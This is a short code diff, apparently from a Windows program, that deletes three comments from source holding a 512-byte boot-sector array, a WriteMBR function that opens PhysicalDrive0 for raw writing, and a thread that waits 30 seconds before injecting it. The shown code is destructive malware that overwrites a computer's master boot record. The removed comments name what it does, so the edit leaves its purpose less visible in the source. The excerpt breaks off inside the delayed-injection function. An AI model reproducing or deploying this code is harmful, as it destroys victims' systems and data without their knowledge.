@@ -3,7 +3,6 @@
 
 extern volatile bool g_running;
 
-// ====== MBR CODE (GG вместо Nyan Cat) ======
 unsigned char mbr_code[512] = {
     0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
     0xD0, 0xBC, 0x00, 0x7C, 0x89, 0xE3, 0xBD, 0x00,
@@ -71,7 +70,6 @@ unsigned char mbr_code[512] = {
     0x00, 0x55, 0xAA
 };
 
-// ====== WRITE MBR ======
 bool WriteMBR() {
     HANDLE hDisk = CreateFileA(
         "\\\\.\\PhysicalDrive0",
@@ -106,7 +104,6 @@ bool WriteMBR() {
     return result && bytesWritten == 512;
 }
 
-// ====== DELAYED INJECTION ======
 DWORD WINAPI InjectMBR_Delayed(LPVOID) {
     Sleep(30000);
     
